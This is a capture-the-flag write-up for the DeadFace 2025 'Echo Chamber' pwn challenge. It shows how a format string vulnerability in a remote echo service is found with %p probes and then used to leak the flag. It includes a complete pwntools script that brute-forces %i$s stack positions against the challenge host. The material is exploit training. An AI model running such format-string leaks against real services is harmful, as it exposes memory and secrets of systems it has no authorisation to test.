---
title : Echo Chamber Write Up [DeadFace 2025]
date : 2025-10-27 16:00:00 -0500
categories : [WriteUps]
tags : [DeadFace 2025, pwn]
---


---

## Echo Chamber

<p style="text-align: left;">
  <img src="{{ '/assets/img/echo_chamber.png' | relative_url }}" alt="Picture of the rules of the chall">
</p>

This challenge involved a pwn task on a remote service. The description "echoes messages without sanitizing input" strongly suggested a format string vulnerability.

### Initial Reconnaissance

First, I connected to the service using netcat to understand its behavior.

nc echochamber.deadface.io 13337


The service presented a simple prompt:
DEADFACE Echo Chamber
Enter your message: 

Sending a normal string like hello simply echoed it back:
Echo: hello

This confirmed the "echo" behavior. The next logical step was to test for a format string vulnerability by sending a format specifier.

Enter your message: %p
Echo: 0x402000

The service did not echo %p. Instead, it echoed a hexadecimal value, which is a classic sign of a printf-like function processing the user's input directly as its format string argument. This confirmed the vulnerability.

### Vulnerability Analysis

To see what was on the stack, I sent a chain of %p specifiers.

Enter your message: %p.%p.%p.%p.%p.%p.%p.%p.%p.%p
Echo: 0x402000.0x402000.0.0x7fffffff.0.0x70252e70252e7025.0x252e70252e70252e. ...

The response was very revealing. The 6th value, 0x70252e70252e7025, is the ASCII representation of p%.p%. in little-endian. This meant that starting from the 6th argument, printf was reading our own input string from the stack.

This deduction was key:

Arguments 1-5 were existing data on the stack.

Arguments 6 onwards were our own input buffer.

The flag (or a pointer to it) was likely either in positions 1-5 or at a later position, after our input string.

### Exploitation

Since the flag is likely a string, it's more efficient to look for a pointer to it rather than leaking the raw stack values. The %s specifier tells printf to take an address from the stack and print the null-terminated string at that location.

By using positional arguments like %i$s (where i is the stack position), we can systematically test each position to see if it holds a pointer to the flag.

The strategy is to loop from i=1 upwards:

Connect to the service.

Send the payload %i$s.

Read the response.

If the response contains deadface, we found the flag.

If not (or if the service crashes, which it will on an invalid pointer), disconnect and try i+1.

### Finding the Flag

I automated this process with a simple Python script using pwntools. The script loops through stack positions, sends the payload, and checks the response.

The script quickly found the flag:

## Flag

<p style="text-align: left;">
  <img src="{{ '/assets/img/flag_echo_chamber.png' | relative_url }}" alt="Picture of the flag returned by our Python script">
</p>

deadface{r3tr0_f0rm4t_L34k_3xp0s3d}


## Full code for the Python Script with pwntools

```python 

 #!/usr/bin/env python3
from pwn import *

HOST = "echochamber.deadface.io"
PORT = 13337

#  teste les 100 premiers arguments de la pile.
for i in range(1, 100):
    try:
        # Affiche quelle position on teste
        log.info(f"[*] Test de la position : {i}")

        # Connexion au service distant
        r = remote(HOST, PORT)

        r.recvuntil(b"Enter your message: ")
        
        # Formatage du payload,
        # .encode() le convertit en bytes pour l'envoi
        payload = f"%{i}$s".encode()

        # Envoi du payload
        r.sendline(payload)
        
        # On lit la réponse. On met un timeout dans le cas ou réponse invalide
        response = r.recvall(timeout=0.5)

        # Vérification !
        if b"deadface{" in response:
            log.success("[***] FLAG TROUVÉ ! [***]")
            
            # On décode la réponse pour l'afficher proprement
            print(response.decode(errors='ignore'))
            break
        r.close()

    except EOFError:
        log.warning(f"Position {i} a causé un crash (EOFError).")
        r.close()
    except Exception as e:
        log.error(f"Erreur à la position {i}: {e}")
        r.close()

log.info("Script terminé.") 

```